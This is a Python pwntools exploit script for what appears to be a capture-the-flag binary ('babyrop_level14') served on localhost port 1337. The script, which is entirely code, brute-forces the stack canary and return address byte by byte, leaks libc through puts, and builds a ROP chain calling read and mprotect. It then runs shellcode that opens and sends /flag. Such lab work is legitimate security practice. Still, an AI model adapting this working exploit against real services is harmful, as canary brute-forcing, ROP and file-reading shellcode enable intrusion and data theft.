from pwn import *

e = ELF('/babyrop_level14_testing1')
libc = e.libc

canary = b'\x00'

while len(canary) < 8:
    for i in range(256):
        if i == 0x10:continue
        print(i)
        # context.log_level = 20
        # p = s.process(['nc','localhost','1337'])
        p = remote('localhost', 1337)
        # context.log_level = 0

        pay = b'A' * 0x78 + canary + bytes([i])
        p.send(pay)

        p.recvuntil(b'Goodbye!\n')
        x = p.recv()
        if b'stack' not in x:
            canary += bytes([i])
            print(canary)
            break
        print(x)
        # print()
        p.close()

    print(x)
    print(canary)
    # pause() 
    p.close()

RET = b'\x69'

for i in range(16):
    print(i)
    # p = s.process(['nc','localhost','1337'])
    p = remote('localhost', 1337)
    pay = b'A' * 0x78 + canary + p64(0) + RET + bytes([(i << 4) | 9])

    p.send(pay)

    p.recvuntil(b'Goodbye!')

    if b'Exiting!' in p.recv(timeout=1):
        RET += bytes([(i << 4) | 9])
        break

    p.close()

p.close()

print(RET)

while len(RET) < 6:
    for i in range(256):
        if i == 0x10:continue
        print(i)
        # p = s.process(['nc','localhost','1337'])
        p = remote('localhost', 1337)
        
        # pid = p.pid
        pay = b'A' * 0x78 + canary + p64(0) + RET + bytes([i])

        p.send(pay)

        p.recvuntil(b'Goodbye!')

        if b'Exiting!' in p.recv(timeout=1):
            RET += bytes([i])
            break

        p.close()

    p.close()

    print(RET[::-1].hex())
    print(RET)

pie = u64(RET + b'\x00\x00') - 0x1969
e.address = pie

rdi = 0x00000000000019e3 + pie

print(hex(pie))
# p = s.process(['nc','localhost','1337'])
        
# pid = p.pid
p = remote('localhost', 1337)
pay = b'A' * 0x78 + canary + p64(0) + p64(rdi) + p64(e.got['puts']) + p64(e.plt['puts'])

p.send(pay)

p.recvuntil(b'Goodbye!\n')
x = p.recvline().strip()
print(x)
base = u64(x+b'\x00\x00') - libc.symbols['puts']
libc.address = base

print(hex(base))
p.close()

# p = s.process(['nc','localhost','1337'])
# pid= p.pid
p = remote('localhost', 1337)

rsi = 0x0000000000027529 + base
rcx = 0x000000000009f822 + base
rdx_r12 = 0x000000000011c371 + base

pay = b'A' * 0x78 + canary + p64(0)
pay += p64(rdi) + p64(0) + p64(rsi) + p64(e.bss() + 0x100) + p64(rdx_r12) + p64(0x100) + p64(0) + p64(libc.symbols['read'])
pay += p64(rdi) + p64((e.bss() + 0x100)&0xFFFFFFFFFFFFF000) + p64(rsi) + p64(0x1000) + p64(rdx_r12) + p64(7) + p64(0) + p64(libc.symbols['mprotect'])
pay += p64(e.bss() + 0x100)
# pay = pay.ljust(0x1000, b'\x00')


context.os = e.os
context.arch = e.arch

p.send(pay)

pay = asm(shellcraft.open('/flag\x00',0))
pay += asm(shellcraft.sendfile(1, 'rax', 0, 0x1000))

sleep(0.1)
p.send(pay)

p.interactive()